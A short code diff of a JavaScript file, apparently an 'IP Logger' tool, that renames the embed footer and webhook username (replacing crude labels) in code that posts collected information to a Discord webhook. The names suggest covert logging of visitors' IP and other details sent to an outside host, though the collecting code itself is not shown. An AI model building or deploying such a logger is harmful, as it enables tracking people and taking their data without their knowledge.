@@ -172,7 +172,7 @@ var myEmbed = {
       }
     ],
      footer: {
-        text: "+10000 Social Credit  •  Logged " + currentdate.toUTCString(),
+        text: "Advanced Info Logger  •  Logged " + currentdate.toUTCString(),
         icon_url: "https://i.imgur.com/1jdoua0.png"
       }
 }
@@ -361,7 +361,7 @@ var myEmbed = {
       request.open("POST", "https://discord.com/api/webhooks/" + webhookid + "/" + webhooktoken);
       request.setRequestHeader('Content-type', 'application/json');
       const params = {
-        username: "Sex Logger [" + makeid(5) + "]",
+        username: "IP Logger [" + makeid(5) + "]",
         avatar_url: "",
         content: content,
         embeds: [ myEmbed ]
